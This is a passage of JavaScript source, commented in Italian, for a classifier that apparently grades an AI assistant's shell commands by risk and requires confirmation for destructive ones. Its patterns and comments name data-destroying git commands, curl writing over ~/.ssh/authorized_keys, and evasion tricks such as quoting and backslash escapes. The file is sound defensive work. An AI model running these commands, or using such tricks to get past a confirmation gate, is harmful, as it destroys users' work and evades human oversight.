  // -f (force su push/checkout/add), -d/-D (delete branch/tag, clean -d) e
  // --delete/--prune. Un check git-specifico (più aggressivo del globale, che
  // su comandi come `tar -f` significherebbe altro) → alza a 3.
  // `--discard-changes` (checkout/switch) BUTTA VIA le modifiche non salvate del
  // working tree tanto quanto `reset --hard`: qui perché è un flag che esiste solo
  // per checkout/switch, entrambi distruttivi quando lo usano → sempre 3.
  const GIT_DANGER_RE = /(^|\s)(--force(-with-lease)?|--hard|--delete|--prune|--discard-changes|-f|-d|-D|-[a-z]*f[a-z]*d[a-z]*|-[a-z]*d[a-z]*f[a-z]*)(\s|$)/i;

  // Argomenti che seguono il sotto-comando git (esclusi programma e
  // sotto-comando stesso). `git tag v1.0` → ['v1.0']; `git branch` → [];
  // `git config --get user.name` → ['--get', 'user.name'].
  function gitArgsAfterSub(cmd) {
    // Token già "spogliati" delle virgolette (vedi unquote): `git checkout ".."`
    // e `git checkout ..` devono essere valutati allo stesso modo.
    const t = tokens(cmd).slice(1).map(unquote).filter(Boolean); // via il programma `git`
    const i = t.findIndex((x) => !x.startsWith('-')); // posizione del sotto-comando
    return i < 0 ? [] : t.slice(i + 1);
  }
  const hasOperand = (args) => args.some((a) => !a.startsWith('-'));

  // Varianti di un operando così come le interpreterebbero le shell supportate
  // (bash, cmd, powershell): oltre alla forma già senza virgolette, quella con
  // il backslash letto come ESCAPE (bash: `\.` → `.`) e quella con il backslash
  // letto come SEPARATORE di percorso (Windows: `.\src` → `./src`). Se anche una
  // sola lettura risulta distruttiva alziamo il livello: meglio una conferma
  // forte di troppo che un comando che scarta lavoro con un semplice OK.
  function argVariants(arg) {
    const a = String(arg);
    return [a, a.replace(/\\(.)/g, '$1'), a.replace(/\\/g, '/')];
  }

  // L'operando prende di mira dei FILE (pathspec) invece di un ramo/commit?
  // `.`, `./`, `.\`, `..`, `src/`, `*.js`, percorsi assoluti, nomi con
  // estensione: git li interpreta come percorsi e `git checkout <percorso>`
  // SCARTA le modifiche non salvate di quei file, esattamente come
  // `git restore`. I nomi di ramo comuni (`main`, `origin/main`, `v1.0`,
  // `feature/login`) NON combaciano e restano alla conferma leggera.
  function looksLikePathspec(arg) {
    for (const v of argVariants(arg)) {
      const bare = v.replace(/[\\/]+$/, ''); // `./` → `.`, `src/` → `src`
      if (bare === '' || bare === '.' || bare === '..') return true; // cartella corrente
      if (/^\.{1,2}[\\/]/.test(v)) return true;                      // ./x, ../x, .\x
      if (/[*?[\]]/.test(v)) return true;                            // glob: *.js, src/*
      if (/^[\\/]/.test(v) || /^[A-Za-z]:[\\/]/.test(v) || v.startsWith('~/')) return true; // assoluti
      if (/[\\/]$/.test(v)) return true;                             // finisce con separatore = cartella
      if (/\.[A-Za-z][A-Za-z0-9]{0,7}$/.test(v)) return true;        // file con estensione
    }
    return false;
  }

  // Sotto-comandi il cui LIVELLO dipende dagli argomenti. Due famiglie:
  //  • "duali" lettura/scrittura: ELENCANO (livello 1) se nudi o con soli flag,
  //    CREANO/IMPOSTANO (livello 2) con un operando. `git tag` elenca / `git tag
  //    v1.0` crea; `git branch` elenca / `git branch nuovo` crea; `git config
  //    --list` legge / `git config user.name "X"` scrive; `git remote -v` elenca
  //    / `git remote add` aggiunge.
  //  • "sicuro vs distruttivo": `checkout` e `stash` hanno forme innocue
  //    (cambio/creazione ramo, salvataggio di uno stash → livello 2) e forme che
  //    SCARTANO LAVORO NON SALVATO in modo irreversibile (livello 3, digita
  //    "conferma"), come i loro gemelli `restore`/`reset --hard`/`clean`.
  // Le forme distruttive a flag (branch -D, tag -d, config --unset, remote
  // remove/prune, checkout -f/--discard-changes) sono già intercettate prima da
  // GIT_DANGER_RE; il resto lo discrimina il predicato qui.
  const GIT_DUAL = {
    tag: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
    branch: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
    // `git checkout` è DISTRUTTIVO quando prende di mira un pathspec: `git
    // checkout .` (scarta TUTTE le modifiche), `git checkout -- <path>`, `git
    // checkout <ref> -- <path>`, `git checkout <ref> <path>` (ripristina il file
    // dal ref, buttando via le modifiche locali) → livello 3. Resta livello 2 il
    // checkout NON distruttivo: cambio ramo (`git checkout main`), creazione
    // (`git checkout -b nuovo [start]`, `-B`), torna-al-precedente (`git checkout
    // -`). La discriminante è la presenza di un pathspec; `-b`/`-B` (e le sue
    // varianti) sono creazione di ramo, MAI scarto di path, anche con 2 operandi.
    checkout: (cmd) => {
      const args = gitArgsAfterSub(cmd);
      // `--` separa esplicitamente i pathspec: tutto ciò che segue è un file da
      // ripristinare (scarto del working tree).
      if (args.includes('--')) return 3;
      // Flag che dichiarano "sto lavorando sui FILE" anche senza scrivere il
      // percorso nel comando: `--pathspec-from-file=<file>` legge l'elenco dei
      // file da un altro file (verificato: scarta davvero le modifiche non
      // salvate), `-p`/`--patch` scarta pezzo per pezzo, `--ours`/`--theirs`
      // sceglie una versione del file in conflitto.
      if (args.some((a) => /^(--pathspec-from-file(=|$)|--pathspec-file-nul$|-p$|--patch$|--ours$|--theirs$)/.test(a))) return 3;
      // `-b`/`-B`/`--orphan`/`--detach`: crea/sposta un ramo, non tocca i path.
      if (args.some((a) => /^(-b|-B|--orphan|--detach)$/.test(a))) return 2;
      const ops = args.filter((a) => !a.startsWith('-'));
      if (ops.some(looksLikePathspec)) return 3; // scarta le modifiche dei file
      if (ops.length >= 2) return 3;             // `<ref> <path>` senza `--`
      return 2;                                  // cambio ramo (0-1 operando)
    },
    // `git stash` SALVA le modifiche (recuperabile con pop → livello 2), ma
    // `git stash drop`/`clear` ELIMINANO stash salvati in modo irreversibile →
    // livello 3. Gli altri sotto-verbi (push/save/pop/apply/list/show) restano 2.
    stash: (cmd) => {
      const raw = gitArgsAfterSub(cmd).filter((a) => !a.startsWith('-'))[0] || '';
      // Anche qui vale la lettura "come la farebbe la shell": `git stash d\rop`
      // elimina lo stash tanto quanto `git stash drop`.
      const verbs = argVariants(raw).map((v) => v.toLowerCase());
      return verbs.some((v) => v === 'drop' || v === 'clear') ? 3 : 2;
    },
    config: (cmd) => {
      const args = gitArgsAfterSub(cmd);
      const low = args.map((a) => a.toLowerCase());
      if (low.some((a) => a === '--unset' || a === '--unset-all' || a === '--remove-section')) return 3;
      if (low.some((a) => a === '--add' || a === '--replace-all' || a === '--rename-section' || a === '-e' || a === '--edit')) return 2;
      // `chiave valore` (≥2 operandi) imposta; `--list`/`--get`/`chiave` (≤1) legge.
      return args.filter((a) => !a.startsWith('-')).length >= 2 ? 2 : 1;
    },
    remote: (cmd) => {
      const ops = gitArgsAfterSub(cmd).filter((a) => !a.startsWith('-'));
      if (!ops.length) return 1; // `git remote`, `git remote -v`
      const action = ops[0].toLowerCase();
      if (action === 'show' || action === 'get-url') return 1;
      if (action === 'remove' || action === 'rm' || action === 'prune') return 3; // cancellazioni
      return 2; // add, rename, set-url, set-head, set-branches, update…
    },
  };

  function classifyGit(cmd) {
    const sub = subcommandOf(cmd);
    if (!sub) return 1; // `git` da solo stampa l'help → lettura
    if (GIT_DESTROY.has(sub)) return 3;
    if (GIT_DANGER_RE.test(cmd)) return 3; // es. push --force, checkout -f, branch -D, tag -d
    const dual = GIT_DUAL[sub];
    if (dual) return dual(cmd); // tag/branch/config/remote: dipende dagli argomenti
    if (GIT_READ.has(sub)) return 1;
    if (GIT_WRITE.has(sub)) return 2;
    return 3; // sotto-comando git sconosciuto → cautela
  }

  function classifyNpm(cmd) {
    const sub = subcommandOf(cmd);
    if (!sub) return 1; // `npm` da solo → help
    // `config`: leggere la configurazione è lettura (get/list/ls/debug/nudo),
    // ma `set`/`delete`/`rm`/`unset`/`edit`/`add` la CAMBIANO — e tra le chiavi
    // c'è il REGISTRY, cioè da dove npm/pip scaricano ed eseguono codice.
    // Reindirizzarlo non è lettura → conferma (2). `edit` apre pure un editor.
    if (sub === 'config') {
      const rest = tokens(cmd).slice(1).map(unquote).filter((t) => !t.startsWith('-'));
      const verb = (rest[1] || '').toLowerCase(); // rest[0] === 'config'
      if (!verb || verb === 'get' || verb === 'list' || verb === 'ls' || verb === 'debug') return 1;
      return 2;
    }
    if (NPM_READ.has(sub)) return 1;
    if (NPM_WRITE.has(sub)) return 2;
    return 3; // run/exec/start/test/publish/sconosciuti → 3
  }

  // Se il comando è una pura sequenza di comandi separati da `&&`, `||` o `;`
  // (senza pipe, background, redirezioni o sostituzioni), ritorna l'elenco dei
  // singoli comandi; altrimenti null. Le sequenze "sicure" si classificano poi
  // pezzo per pezzo prendendo il massimo: concatenare due letture (cd && ls)
  // non deve trasformarle in un'azione irreversibile.
  function splitSafeSequence(cmd) {
    // Metacaratteri che NON sono semplice sequenziamento: redirezioni,
    // sostituzioni, backtick, newline → non è una sequenza sicura.
    if (/[`<>]|\$\(|\$\{|\r|\n/.test(cmd)) return null;
    const parts = cmd.split(/\s*(?:&&|\|\||;)\s*/).filter(Boolean);
    // Dopo aver tolto `&&`/`||`/`;`, un `&` o `|` "solitario" residuo significa
    // background o pipe → non è una sequenza sicura.
    for (const p of parts) {
      if (/[&|]/.test(p)) return null;
    }
    return parts;
  }

  // Livello di un SINGOLO comando (senza metacaratteri di sequenza).
  function classifyOne(raw) {
    // Valuta sempre la forma senza virgolette: `git push "--force"`,
    // `curl "-o" ~/.ssh/authorized_keys`, `git checkout .""` fanno esattamente
    // ciò che farebbero senza, e devono ricevere lo stesso livello (vedi
    // unquote). Le virgolette non possono nascondere neppure i metacaratteri:
    // quelli sono già stati intercettati prima, sul testo grezzo.
    const trimmed = dequote(raw);
    const prog = programOf(trimmed);
    if (!prog) return 3;
    if (ALWAYS_3.has(prog)) return 3; // backstop: vale anche col percorso (`/bin/rm`)

    // Superato il backstop dei distruttivi, la whitelist FIDA di un nome solo se
    // è invocato nudo. Un file su disco che si chiama come un comando fidato
    // (`.\Get-ChildItem.exe`, `C:\tmp\ls.exe`, `git.exe` dal PATH) NON è quel
    // comando: è un eseguibile arbitrario → livello 3 di default.
    if (!isBareName(tokens(trimmed)[0])) return 3;

    if (prog === 'git') return classifyGit(trimmed);
    if (prog === 'npm' || prog === 'pip' || prog === 'pip3') return classifyNpm(trimmed);

    // Interpreti / build tool: codice arbitrario → 3, ma la sola interrogazione
    // di versione/help è lettura → 1 (es. `node --version`, `go version`).
    if (ARBITRARY_CODE.has(prog)) return isVersionQuery(trimmed) ? 1 : 3;

    if (LEVEL1.has(prog)) {
      // Quasi tutti i LEVEL1 restano 1 anche con flag (la lettura non diventa
      // distruttiva). Eccezione: i pochi comandi che con certi argomenti
      // IMPOSTANO lo stato (date -s, hostname <nome>) salgono a 2 (conferma).
      const mutates = LEVEL1_MUTATES[prog];
      return mutates && mutates(trimmed) ? 2 : 1;
    }
    // Anche un comando LEVEL2 ridotto a `--version`/`--help` è sola lettura → 1.
    if (LEVEL2.has(prog)) {
      if (isVersionQuery(trimmed)) return 1;
      // curl/wget che scrivono un file di output a un percorso arbitrario possono
      // sovrascrivere qualsiasi file (chiavi SSH, script d'avvio) → 3.
      if ((prog === 'curl' || prog === 'wget') && CURL_WGET_OUTPUT_RE.test(trimmed)) return 3;
      // wget -P/--directory-prefix: sceglie la dir, il nome file arriva dall'URL
      // (server) → stessa scrittura arbitraria di -O → 3.
      if (prog === 'wget' && WGET_PREFIX_RE.test(trimmed)) return 3;
      // curl -D/--dump-header: scrive gli header (contenuto del server) in un
      // percorso arbitrario → 3.
      if (prog === 'curl' && CURL_DUMP_RE.test(trimmed)) return 3;
      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr:
      // salvano dati accessori influenzati dal server in un percorso scelto → 3.
      if (prog === 'curl' && CURL_ACCESSORY_WRITE_RE.test(trimmed)) return 3;
      // wget --save-cookies: scrive i cookie del sito in un percorso scelto → 3.
      if (prog === 'wget' && WGET_SAVE_COOKIES_RE.test(trimmed)) return 3;
      // curl -K/--config: le opzioni (output compreso) arrivano da un file, quindi
      // l'effetto non si legge nel comando → 3.
      if (prog === 'curl' && CURL_CONFIG_RE.test(trimmed)) return 3;
      // wget fa SEMPRE atterrare un file su disco (nome dall'URL, cartella = cwd,
      // che l'assistente sposta da sé con un `cd` senza conferma) → 3. Solo
      // `--spider`, che si limita a controllare se l'URL esiste, resta 2.
      if (prog === 'wget' && !WGET_NO_DOWNLOAD_RE.test(trimmed)) return 3;
      // robocopy /MIR /PURGE (cancellano la destinazione) / /MOVE /MOV
      // (cancellano la sorgente): distruzione permanente → 3.
      if (prog === 'robocopy' && ROBOCOPY_DESTRUCTIVE_RE.test(trimmed)) return 3;
      return DANGEROUS_FLAG_RE.test(trimmed) ? 3 : 2;
    }

    // Cmdlet PowerShell di sola lettura (`Get-ChildItem`, `Select-String`…): 1
    // solo se supera anche i controlli strutturali (niente sottoespressioni,
    // niente scriptblock che invoca). Where-Object/ForEach-Object NON passano di
    // qui: da soli non filtrano niente, valgono solo dentro una pipeline.
    // Passiamo `raw` (con le virgolette): segmentIsRead deve poter riconoscere i
    // letterali quotati come inerti.
    if (PS_READ.has(prog) && segmentIsRead(raw, false)) return 1;

    return 3; // comando non riconosciuto → livello 3 di default
  }

  // Livello di sicurezza del comando: 1 | 2 | 3. Mai null: l'ignoto è 3.
  function classify(cmd) {
    if (typeof cmd !== 'string') return 3;
    const trimmed = cmd.trim();
    if (!trimmed) return 3;

    // Sequenza pura di comandi (`&&`/`||`/`;`) → livello = massimo dei pezzi.
    // Vale anche con UN SOLO pezzo: `git checkout .;` (separatore in coda, forma
    // che la shell esegue identica a `git checkout .`) deve essere classificato
    // sul comando vero, non sul token `.;` che non somiglia a nulla di noto.
    const seq = splitSafeSequence(trimmed);
    if (seq && seq.length) {
      return seq.reduce((max, part) => Math.max(max, classifyOne(part)), 1);
    }
    // Pipeline di sole letture (`Get-ChildItem | Sort-Object | Select-Object
    // -First 5`, `cat file | grep errore`) → livello 1: incanalare una lettura
    // dentro un'altra lettura non produce niente che la prima non facesse già.
    // Basta UN segmento non riconosciuto — o uno scriptblock che potrebbe
    // invocare qualcosa — e si torna al 3 di prima.
    const pipe = splitSafePipeline(trimmed);
    if (pipe) return pipe.every((p) => segmentIsRead(p, true)) ? 1 : 3;

    // Pipe / background / redirezioni / sostituzioni: non riconoscibili → 3.
    if (!seq && CHAIN_RE.test(trimmed)) return 3;

    return classifyOne(trimmed);
  }

  global.SN_CMD_CLASSIFY = { classify, programOf, subcommandOf };
})(typeof globalThis !== 'undefined' ? globalThis : self);
